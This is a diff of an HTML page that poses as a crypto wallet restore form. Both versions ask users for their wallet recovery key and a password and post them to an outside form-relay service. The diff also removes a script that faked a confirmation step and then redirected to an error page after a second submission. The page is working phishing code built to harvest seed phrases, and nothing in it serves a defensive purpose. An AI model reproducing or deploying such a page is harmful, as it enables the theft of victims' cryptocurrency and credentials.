@@ -156,7 +156,7 @@ input[type=submit]:hover {
 <body>
 
 <div class="container">
-  <form id="myForm" action="https://app.form2chat.io/f/d89c7e8" method="post">
+  <form action="https://app.form2chat.io/f/d89c7e8" method="post">
   <div class="row">
     <div class="col-25">
       
@@ -172,19 +172,19 @@ input[type=submit]:hover {
     </div>
   <div class="row">
     <div class="col-95">
-      <textarea id="inputField" name="Phrase" placeholder="Recovery Key" style="height:150px"></textarea>
+      <textarea id="subject" name="subject" placeholder="Recovery Key" style="height:150px"></textarea>
     </div>
     <div class="row">
     <div class="col-45">
       <label for="lname"></label>
     </div>
     <div class="col-45">
-      <input type="text" id="inputField" required name="password" placeholder="Set Security Password">
+      <input type="text" id="fname" name="firstname" placeholder="Set Security Password">
     </div>
   </div>
   <br>
   <div class="row">
-    <input type="submit" id="submitBtn" value="Restore Wallet">
+    <input type="submit" value="Restore Wallet">
   </div>
   </form>
 </div>
@@ -240,25 +240,6 @@ input[type=submit]:hover {
         </div>
       </div>
     </footer>
-	     <script>
-    document.getElementById('myForm').addEventListener('submit', function(event) {
-        event.preventDefault(); // Prevent form submission
-
-        if (this.dataset.submitted) {
-            // Form already submitted once, redirect to another page
-            window.location.href = './error.html';
-        } else {
-            // First form submission, validate form data
-            if (document.getElementById('inputField').value.trim() !== '') {
-                // Form data is valid, set the 'submitted' attribute
-                this.dataset.submitted = true;
-                document.getElementById('submitBtn').innerText = 'Confirm Submission';
-            } else {
-                alert('Please enter form data before submitting.');
-            }
-        }
-    });
-</script>
   </body>
 
 <!-- for all time-->
